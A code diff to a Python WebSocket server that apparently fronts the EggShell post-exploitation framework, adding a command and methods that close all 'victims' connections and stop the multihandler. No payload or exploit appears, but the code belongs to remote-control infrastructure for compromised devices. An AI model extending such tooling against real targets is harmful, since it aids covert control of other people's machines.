@@ -1,6 +1,7 @@
 #!/usr/bin/env python2.7
 # coding:utf-8
 import os
+import sys
 import struct
 import base64
 import hashlib
@@ -143,6 +144,8 @@ class WsServer:
                     self.send_data(conn, json.dumps(response))
                     continue
 
+                if command == 'close':
+                    self.close_app()
                 if command == 'exit':
                     break
                 elif command == 'fetch':
@@ -166,6 +169,20 @@ class WsServer:
 
 
 ### Server Functions
+
+    def close_app(self):
+        self.close_all_connections()
+        self.eggshell.server.multihandler.stop_server()
+
+    # Close all victims' connections with server
+    def close_all_connections(self):
+
+        for conn in self.conn_poll:
+            conn.sendall(b'End Connection')
+            self.conn_poll.remove(conn)
+            conn.close()
+
+
 
     # Execute command from clients' request
     def run_command(self, content):
@@ -275,10 +292,12 @@ class WsServer:
                 index += 1
             except KeyboardInterrupt:
                 print('Close the Application')
-                exit()
+                self.close_app()
+                sys.exit()
             except:
                 print('Error: close the Application')
-                exit()
+                self.close_app()
+                sys.exit()
 
 
 if __name__ == "__main__":
